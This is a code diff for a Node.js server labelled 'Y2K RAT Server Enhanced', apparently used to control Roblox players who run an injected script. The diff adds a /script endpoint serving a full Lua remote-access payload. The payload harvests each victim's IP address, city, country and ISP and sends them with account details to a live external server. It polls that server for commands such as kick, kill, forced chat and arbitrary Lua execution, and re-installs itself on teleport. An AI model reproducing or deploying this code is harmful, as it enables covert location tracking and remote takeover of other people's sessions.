@@ -59,14 +59,11 @@ app.post('/log', (req, res) => {
             platform, 
             executor, 
             timestamp, 
-            ip,
-            country,
-            city,
-            isp,
+            ip, 
             status = 'online' 
         } = req.body;
 
-        console.log('📥 [LOG] Received data:', { username, userid, executor, ip, country, city });
+        console.log('📥 [LOG] Received data:', { username, userid, executor });
 
         if (!userid) {
             console.warn('⚠️ Missing userid in /log');
@@ -86,9 +83,6 @@ app.post('/log', (req, res) => {
             platform: platform || 'Unknown',
             executor: executor || 'Unknown',
             ip: ip || 'Hidden',
-            country: country || 'Unknown',
-            city: city || 'Unknown',
-            isp: isp || 'Unknown',
             status: 'online',
             lastSeen: Date.now(),
             firstSeen: isNewPlayer ? Date.now() : players.get(userid.toString()).firstSeen
@@ -101,13 +95,11 @@ app.post('/log', (req, res) => {
                 username,
                 executor,
                 game,
-                ip,
-                country,
-                city
+                ip
             });
         }
         
-        console.log(`✅ [${isNewPlayer ? 'NEW' : 'UPDATE'}] ${username} (${userid}) - ${executor} | IP: ${ip} | ${city}, ${country} | Total: ${players.size}`);
+        console.log(`✅ [${isNewPlayer ? 'NEW' : 'UPDATE'}] ${username} (${userid}) - ${executor} | Total: ${players.size}`);
         res.json({ success: true, message: 'Player logged successfully' });
     } catch (error) {
         console.error('❌ Error in /log:', error);
@@ -128,6 +120,7 @@ app.post('/heartbeat', (req, res) => {
         if (player) {
             player.lastSeen = Date.now();
             player.status = 'online';
+            // console.log(`💚 [HEARTBEAT] ${player.username} (${userid})`); // Commenté pour éviter le spam
         } else {
             console.log(`⚠️ [HEARTBEAT] Unknown player: ${userid}`);
         }
@@ -176,12 +169,12 @@ app.get('/players', (req, res) => {
     }
 });
 
-// Endpoint pour envoyer des commandes depuis le panel
+// Endpoint pour envoyer des commandes depuis le panel (AMÉLIORÉ)
 app.post('/command', (req, res) => {
     try {
         const { 
             userid,
-            userids,
+            userids, // Support pour plusieurs utilisateurs
             command, 
             reason, 
             speed, 
@@ -193,6 +186,7 @@ app.post('/command', (req, res) => {
             x, y, z
         } = req.body;
 
+        // Support pour bulk actions
         const targetUserIds = userids || [userid];
         
         if (!targetUserIds || targetUserIds.length === 0) {
@@ -222,6 +216,7 @@ app.post('/command', (req, res) => {
             if (z) commandData.z = z;
         }
 
+        // Envoyer la commande à tous les utilisateurs ciblés
         let successCount = 0;
         for (const uid of targetUserIds) {
             const targetId = uid.toString();
@@ -351,7 +346,7 @@ app.delete('/player/:userid', (req, res) => {
     }
 });
 
-// Endpoint pour supprimer plusieurs joueurs
+// Endpoint pour supprimer plusieurs joueurs (NOUVEAU)
 app.post('/players/delete-multiple', (req, res) => {
     try {
         const { userids } = req.body;
@@ -386,7 +381,7 @@ app.get('/health', (req, res) => {
     res.json({ 
         status: 'online',
         name: 'Y2K RAT Server Enhanced',
-        version: '2.1.0',
+        version: '2.0.0',
         players: players.size,
         commands: commands.size,
         uptime: process.uptime()
@@ -396,6 +391,322 @@ app.get('/health', (req, res) => {
 // Root endpoint
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Endpoint pour servir le script Lua (pour auto-reload sur téléportation)
+app.get('/script', (req, res) => {
+    res.setHeader('Content-Type', 'text/plain');
+    res.send(`
+local SERVER_URL = "https://robloxlol-production.up.railway.app"
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+
+local function getIPInfo()
+    local ip = "Hidden"
+    local country = "Unknown"
+    local city = "Unknown"
+    local isp = "Unknown"
+    
+    local success1, result1 = pcall(function()
+        return game:HttpGet("https://api.ipify.org?format=json")
+    end)
+    if success1 then
+        local data = HttpService:JSONDecode(result1)
+        ip = data.ip or "Hidden"
+    end
+    
+    if ip ~= "Hidden" then
+        local success2, result2 = pcall(function()
+            return game:HttpGet("http://ip-api.com/json/" .. ip)
+        end)
+        if success2 then
+            local geoData = HttpService:JSONDecode(result2)
+            country = geoData.country or "Unknown"
+            city = geoData.city or "Unknown"
+            isp = geoData.isp or "Unknown"
+        end
+    end
+    
+    return {
+        ip = ip,
+        country = country,
+        city = city,
+        isp = isp
+    }
+end
+
+local function getExecutorName()
+    if syn then return "Synapse X"
+    elseif KRNL_LOADED then return "KRNL"
+    elseif Fluxus then return "Fluxus"
+    elseif getexecutorname then return getexecutorname() or "Unknown"
+    else return "Unknown" end
+end
+
+local function getPlayerInfo()
+    local player = LocalPlayer
+    local gameName = "Unknown"
+    pcall(function()
+        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    end)
+    
+    local ipInfo = getIPInfo()
+   
+    return {
+        username = player.Name,
+        displayname = player.DisplayName,
+        userid = tostring(player.UserId),
+        accountAge = tostring(player.AccountAge),
+        premium = player.MembershipType == Enum.MembershipType.Premium,
+        game = gameName,
+        placeId = tostring(game.PlaceId),
+        jobId = game.JobId,
+        platform = tostring(game:GetService("UserInputService"):GetPlatform()),
+        executor = getExecutorName(),
+        timestamp = os.date("%d/%m/%Y %H:%M:%S"),
+        ip = ipInfo.ip,
+        country = ipInfo.country,
+        city = ipInfo.city,
+        isp = ipInfo.isp,
+        status = "online"
+    }
+end
+
+local function sendToServer(playerInfo)
+    local payload = HttpService:JSONEncode(playerInfo)
+   
+    local success = pcall(function()
+        request({
+            Url = SERVER_URL .. "/log",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = payload
+        })
+    end)
+   
+    if not success then
+        pcall(function()
+            syn.request({
+                Url = SERVER_URL .. "/log",
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+        end)
+    end
+   
+    if not success then
+        pcall(function()
+            http_request({
+                Url = SERVER_URL .. "/log",
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = payload
+            })
+        end)
+    end
+end
+
+local function startHeartbeat()
+    spawn(function()
+        while wait(10) do
+            local success = pcall(function()
+                request({
+                    Url = SERVER_URL .. "/heartbeat",
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode({
+                        userid = tostring(LocalPlayer.UserId),
+                        status = "online",
+                        timestamp = os.date("%d/%m/%Y %H:%M:%S")
+                    })
+                })
+            end)
+           
+            if not success then
+                pcall(function()
+                    syn.request({
+                        Url = SERVER_URL .. "/heartbeat",
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = HttpService:JSONEncode({
+                            userid = tostring(LocalPlayer.UserId),
+                            status = "online",
+                            timestamp = os.date("%d/%m/%Y %H:%M:%S")
+                        })
+                    })
+                end)
+            end
+           
+            if not success then
+                pcall(function()
+                    http_request({
+                        Url = SERVER_URL .. "/heartbeat",
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = HttpService:JSONEncode({
+                            userid = tostring(LocalPlayer.UserId),
+                            status = "online",
+                            timestamp = os.date("%d/%m/%Y %H:%M:%S")
+                        })
+                    })
+                end)
+            end
+        end
+    end)
+end
+
+local function executeCommand(cmd)
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
+   
+    if cmd.command == "kick" then
+        LocalPlayer:Kick(cmd.reason or "Kicked by admin")
+       
+    elseif cmd.command == "message" then
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Admin Message",
+            Text = cmd.text or "",
+            Duration = 10
+        })
+       
+    elseif cmd.command == "speed" then
+        if humanoid then
+            humanoid.WalkSpeed = tonumber(cmd.speed) or 16
+        end
+       
+    elseif cmd.command == "jump" then
+        if humanoid then
+            humanoid.JumpPower = tonumber(cmd.power) or 50
+        end
+       
+    elseif cmd.command == "teleport" then
+        if rootPart and cmd.x and cmd.y and cmd.z then
+            rootPart.CFrame = CFrame.new(tonumber(cmd.x), tonumber(cmd.y), tonumber(cmd.z))
+        end
+       
+    elseif cmd.command == "freeze" then
+        if rootPart then
+            rootPart.Anchored = true
+        end
+       
+    elseif cmd.command == "unfreeze" then
+        if rootPart then
+            rootPart.Anchored = false
+        end
+       
+    elseif cmd.command == "invisible" then
+        if character then
+            for _, part in pairs(character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.Transparency = 1
+                end
+                if part:IsA("Decal") or part:IsA("Face") then
+                    part.Transparency = 1
+                end
+            end
+        end
+       
+    elseif cmd.command == "visible" then
+        if character then
+            for _, part in pairs(character:GetDescendants()) do
+                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                    part.Transparency = 0
+                end
+                if part:IsA("Decal") or part:IsA("Face") then
+                    part.Transparency = 0
+                end
+            end
+        end
+       
+    elseif cmd.command == "god" then
+        if humanoid then
+            humanoid.MaxHealth = math.huge
+            humanoid.Health = math.huge
+        end
+       
+    elseif cmd.command == "ungod" then
+        if humanoid then
+            humanoid.MaxHealth = 100
+            humanoid.Health = 100
+        end
+       
+    elseif cmd.command == "kill" then
+        if humanoid then
+            humanoid.Health = 0
+        end
+       
+    elseif cmd.command == "respawn" then
+        LocalPlayer:LoadCharacter()
+       
+    elseif cmd.command == "chat" then
+        if cmd.chatMessage then
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cmd.chatMessage, "All")
+        end
+       
+    elseif cmd.luaCode then
+        local success, err = pcall(function()
+            loadstring(cmd.luaCode)()
+        end)
+       
+        pcall(function()
+            request({
+                Url = SERVER_URL .. "/exec-result",
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    userid = tostring(LocalPlayer.UserId),
+                    success = success,
+                    result = success and "Code executed successfully" or "",
+                    error = err or ""
+                })
+            })
+        end)
+    end
+end
+
+local function listenForCommands()
+    spawn(function()
+        while wait(2) do
+            local success, commands = pcall(function()
+                local response = game:HttpGet(SERVER_URL .. "/commands/" .. LocalPlayer.UserId)
+                return HttpService:JSONDecode(response)
+            end)
+           
+            if success and commands and #commands > 0 then
+                for _, cmd in ipairs(commands) do
+                    pcall(function()
+                        executeCommand(cmd)
+                    end)
+                end
+            end
+        end
+    end)
+end
+
+local playerInfo = getPlayerInfo()
+sendToServer(playerInfo)
+startHeartbeat()
+listenForCommands()
+
+game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(TeleportState)
+    if TeleportState == Enum.TeleportState.Started then
+        queue_on_teleport([[
+            wait(1)
+            loadstring(game:HttpGet("]] .. SERVER_URL .. [[/script"))()
+        ]])
+    end
+end)
+
+LocalPlayer.CharacterAdded:Connect(function(character)
+    wait(2)
+    local newInfo = getPlayerInfo()
+    sendToServer(newInfo)
+end)
+    `);
 });
 
 // Nettoyage automatique des joueurs inactifs
@@ -446,14 +757,12 @@ app.use((err, req, res, next) => {
 // Démarrage du serveur
 app.listen(PORT, '0.0.0.0', () => {
     console.log('╔════════════════════════════════════════╗');
-    console.log('║     Y2K RAT SERVER v2.1 ENHANCED      ║');
-    console.log('║         IP Tracking Enabled           ║');
+    console.log('║      Y2K RAT SERVER v2.0 ENHANCED     ║');
     console.log('╚════════════════════════════════════════╝');
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`📡 Local: http://localhost:${PORT}`);
     console.log(`🌐 Network: http://0.0.0.0:${PORT}`);
     console.log(`✅ Ready to accept connections`);
     console.log(`⚡ Bulk actions enabled`);
-    console.log(`🌍 IP geolocation enabled`);
     console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
 });
